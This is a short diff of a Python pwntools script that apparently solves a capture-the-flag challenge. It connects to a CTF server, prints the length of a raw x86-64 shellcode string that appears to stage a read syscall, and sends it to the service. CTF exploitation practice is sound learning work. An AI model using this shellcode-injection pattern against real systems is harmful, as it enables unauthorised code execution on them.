@@ -6,9 +6,10 @@ from pwn import *
 host , port = 'ctf.yuawn.idv.tw' , 10104
 y = remote( host , port )
 
-y.interactive()
 
 sc = '1\xff\xbe\x70\x10`\x00\xba\x00\x01\x00\x001\xc0\x0f\x05'
+
+print len( sc )
 
 y.send( sc )
 
